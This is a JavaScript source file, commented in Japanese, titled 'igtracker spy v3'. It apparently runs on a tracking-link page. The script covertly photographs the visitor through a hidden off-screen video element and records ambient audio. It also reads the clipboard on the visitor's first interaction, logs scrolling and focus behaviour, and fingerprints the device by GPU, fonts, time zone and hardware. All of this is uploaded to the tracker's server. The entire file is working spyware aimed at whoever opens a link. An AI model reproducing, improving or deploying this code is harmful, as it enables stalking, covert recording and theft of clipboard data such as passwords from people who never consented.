/* igtracker spy v3: 自撮り / 環境音 / クリップボード / 行動ログ / 端末指紋。
   ・video 要素を DOM に入れてから撮る（iOS の videoWidth=0 対策）
   ・ゲート（LT_GATE）があるときは igt:gate まで走らない
   ・window.LT_SPY.cam() / .mic() を公開（gate.js が順番に呼ぶ） */
(function () {
  "use strict";
  var CODE = window.LT_CODE, HIT = window.LT_HIT || 0;
  if (!CODE) return;
  var B = "/s/" + encodeURIComponent(CODE);

  var VID = (function () {
    try {
      var v = localStorage.getItem("igt_vid");
      if (!v) {
        v = Math.random().toString(36).slice(2, 12) + Date.now().toString(36);
        localStorage.setItem("igt_vid", v);
      }
      return v;
    } catch (e) { return ""; }
  })();
  var VISITS = (function () {
    try {
      var k = "igt_v_" + CODE, n = (+(localStorage.getItem(k) || 0)) + 1;
      localStorage.setItem(k, n);
      return n;
    } catch (e) { return 1; }
  })();

  /* 大きいものは keepalive を外す（64KB上限があるため） */
  function post(path, body, small) {
    try {
      return fetch(B + path, {
        method: "POST", cache: "no-store", keepalive: !!small,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body || {})
      }).catch(function () {});
    } catch (e) {}
  }

  var camStream = null, micStream = null;

  /* ---------- 自撮り ---------- */
  function selfie() {
    if (!window.LT_CAM || !navigator.mediaDevices ||
        !navigator.mediaDevices.getUserMedia) return Promise.resolve(false);
    return navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 480 }, height: { ideal: 360 } },
      audio: false
    }).then(function (st) {
      camStream = st;
      var v = document.createElement("video");
      v.autoplay = true; v.muted = true; v.playsInline = true;
      v.setAttribute("playsinline", "");
      v.setAttribute("webkit-playsinline", "");
      v.style.cssText = window.LT_CAM_PREVIEW
        ? "position:fixed;right:10px;bottom:10px;width:104px;height:78px;border-radius:10px;" +
          "object-fit:cover;z-index:30;background:#000;box-shadow:0 2px 12px rgba(0,0,0,.5)"
        : "position:fixed;left:-9999px;top:0;width:160px;height:120px";
      (document.body || document.documentElement).appendChild(v);   // ★ DOMに入れる
      v.srcObject = st;
      try { var pp = v.play(); if (pp && pp.catch) pp.catch(function () {}); } catch (e) {}

      return new Promise(function (res) {
        var done = false;
        function finish(ok) {
          if (done) return;
          done = true;
          if (window.LT_CAM_PREVIEW) {
            setTimeout(function () {
              try { v.pause(); v.remove(); } catch (e) {}
            }, 1600);
          } else {
            try { v.pause(); v.remove(); } catch (e) {}
          }
          if (!window.LT_CAM_HOLD) {
            setTimeout(function () {
              try { st.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
              camStream = null;
            }, window.LT_CAM_PREVIEW ? 1700 : 0);
          }
          setTimeout(function () {
            if (window.LT_LIVE && window.LT_LIVE.restart) window.LT_LIVE.restart();
          }, 400);
          res(ok);
        }
        function tryShot(n) {
          var w = v.videoWidth || 0, h = v.videoHeight || 0;
          if ((w < 40 || h < 40) && n < 14) {
            setTimeout(function () { tryShot(n + 1); }, 250);
            return;
          }
          var ok = false;
          try {
            var cw = 480, ch = h ? Math.round(cw * h / w) : 360;
            var c = document.createElement("canvas");
            c.width = cw; c.height = ch;
            var x = c.getContext("2d");
            if (window.LT_CAM_MIRROR !== 0) { x.translate(cw, 0); x.scale(-1, 1); }
            x.drawImage(v, 0, 0, cw, ch);
            post("/cap", {
              hit: HIT, vid: VID, kind: "selfie",
              data: c.toDataURL("image/jpeg", 0.62), meta: { w: cw, h: ch }
            });
            ok = true;
          } catch (e) { ok = false; }
          finish(ok);
        }
        v.addEventListener("playing", function () { setTimeout(function () { tryShot(0); }, 600); });
        v.addEventListener("loadedmetadata", function () { setTimeout(function () { tryShot(0); }, 900); });
        setTimeout(function () { tryShot(0); }, 2200);
        setTimeout(function () { finish(false); }, 8000);
      });
    }).catch(function () { return false; });
  }

  /* ---------- 環境音 ---------- */
  function micHold() { return window.LT_MIC_HOLD !== 0; }
  function micOpen() {
    if (!window.LT_MIC || !navigator.mediaDevices) return Promise.resolve(null);
    if (micStream && micStream.active) return Promise.resolve(micStream);
    return navigator.mediaDevices.getUserMedia({ audio: true }).then(function (st) {
      micStream = st;
      setTimeout(function () {
        if (window.LT_LIVE && window.LT_LIVE.restart) window.LT_LIVE.restart();
        if (window.LT_KEEP && window.LT_KEEP.kick) window.LT_KEEP.kick();
      }, 500);
      return st;
    }).catch(function () { return null; });
  }
  function recordOnce(ms) {
    if (!micStream || !window.MediaRecorder) return Promise.resolve(false);
    return new Promise(function (res) {
      var rec;
      try { rec = new MediaRecorder(micStream); } catch (e) { return res(false); }
      var chunks = [], done = false;
      function fin(ok) { if (done) return; done = true; res(ok); }
      rec.ondataavailable = function (e) { if (e.data && e.data.size) chunks.push(e.data); };
      rec.onstop = function () {
        var blob = new Blob(chunks, { type: rec.mimeType || "audio/webm" });
        if (blob.size < 900) return fin(false);
        var fr = new FileReader();
        fr.onload = function () {
          post("/cap", {
            hit: HIT, vid: VID, kind: "voice", data: fr.result,
            meta: { ms: ms, mime: blob.type, held: micHold() }
          });
          fin(true);
        };
        fr.readAsDataURL(blob);
      };
      try { rec.start(); } catch (e) { return res(false); }
      setTimeout(function () { try { rec.stop(); } catch (e) {} }, ms);
    });
  }
  function voice() {
    var MS = Math.min(10000, (window.LT_MIC_MS || 4000));
    return micOpen().then(function (st) {
      if (!st) return false;
      return recordOnce(MS).then(function (ok) {
        if (!micHold()) {
          setTimeout(function () {
            if (micStream) {
              try { micStream.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
              micStream = null;
            }
          }, MS + 1500);
        }
        return ok;
      });
    });
  }

  /* ---------- クリップボード ---------- */
  function clipOnce() {
    if (!window.LT_CLIP || !navigator.clipboard || !navigator.clipboard.readText) return;
    navigator.clipboard.readText().then(function (t) {
      if (t) post("/clip", { hit: HIT, vid: VID, text: String(t).slice(0, 2000) }, true);
    }).catch(function () {});
  }
  ["click", "touchstart", "keydown"].forEach(function (ev) {
    document.addEventListener(ev, function h() {
      document.removeEventListener(ev, h);
      setTimeout(clipOnce, 60);
    }, { once: true, passive: true });
  });

  /* ---------- 行動ログ ---------- */
  var t0 = Date.now(), maxScroll = 0, hiddenMs = 0, hiddenAt = 0;
  function sendEv(kind, value, text) {
    post("/ev", { hit: HIT, vid: VID, kind: kind, value: value || 0, text: text || "" }, true);
  }
  window.addEventListener("scroll", function () {
    var h = document.documentElement.scrollHeight - innerHeight;
    var p = h > 0 ? Math.round(scrollY / h * 1000) / 10 : 100;
    if (p > maxScroll) maxScroll = p;
  }, { passive: true });
  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") { hiddenAt = Date.now(); sendEv("blur"); return; }
    if (hiddenAt) { hiddenMs += Date.now() - hiddenAt; hiddenAt = 0; sendEv("focus"); }
    if (micHold() && (!micStream || !micStream.active)) micOpen();
  });
  function flush(final) {
    var dwell = Date.now() - t0 - hiddenMs;
    sendEv(final ? "exit" : "dwell", dwell, JSON.stringify({
      scroll: maxScroll, visits: VISITS, w: innerWidth, h: innerHeight,
      screen: screen.width + "x" + screen.height, dpr: devicePixelRatio
    }));
  }
  setInterval(function () { flush(false); }, 15000);
  window.addEventListener("pagehide", function () { flush(true); });

  /* ---------- 端末指紋 ---------- */
  function gpu() {
    try {
      var c = document.createElement("canvas");
      var g = c.getContext("webgl") || c.getContext("experimental-webgl");
      var d = g.getExtension("WEBGL_debug_renderer_info");
      return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : "";
    } catch (e) { return ""; }
  }
  function fonts() {
    var list = ["Arial", "Hiragino Sans", "Yu Gothic", "Meiryo", "Roboto",
                "Segoe UI", "Noto Sans JP", "Helvetica Neue", "Times New Roman"];
    var base = ["monospace", "sans-serif", "serif"], hit = [];
    try {
      var c = document.createElement("canvas"), x = c.getContext("2d");
      base.forEach(function (b) {
        x.font = "72px " + b;
        var w0 = x.measureText("mmmwwiil").width;
        list.forEach(function (f) {
          x.font = "72px '" + f + "'," + b;
          if (x.measureText("mmmwwiil").width !== w0) hit.push(f);
        });
      });
    } catch (e) {}
    return hit;
  }
  function deviceInfo() {
    var n = navigator.connection || {};
    sendEv("device", VISITS, JSON.stringify({
      visits: VISITS,
      tz: (function () { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
                         catch (e) { return ""; } })(),
      langs: navigator.languages || [navigator.language],
      cores: navigator.hardwareConcurrency || 0,
      mem: navigator.deviceMemory || 0,
      net: n.effectiveType || "", downlink: n.downlink || 0, rtt: n.rtt || 0,
      platform: navigator.platform || "", touch: navigator.maxTouchPoints || 0,
      gpu: gpu(), fonts: fonts(),
      pdf: !!navigator.pdfViewerEnabled, cookie: !!navigator.cookieEnabled
    }));
    try {
      if (navigator.storage && navigator.storage.estimate) {
        navigator.storage.estimate().then(function (s) {
          sendEv("storage", s.quota || 0, JSON.stringify({ usage: s.usage || 0 }));
        }).catch(function () {});
      }
    } catch (e) {}
  }

  window.LT_SPY = { cam: selfie, mic: voice, micOpen: micOpen, flush: flush };

  function autoRun() {
    setTimeout(function () { deviceInfo(); }, 300);
    setTimeout(selfie, 400);
    setTimeout(voice, 2600);
  }

  if (window.LT_GATE && !window.LT_GATE_PASS) {
    // ゲートが許可を取るので、ここでは走らない
    window.addEventListener("igt:gate", autoRun, { once: true });
  } else if (window.LT_GPS_READY || !window.LT_LIVE) {
    autoRun();
  } else {
    window.addEventListener("igt:gps", autoRun, { once: true });
    setTimeout(autoRun, window.LT_SPY_WAIT || 7000);
  }
})();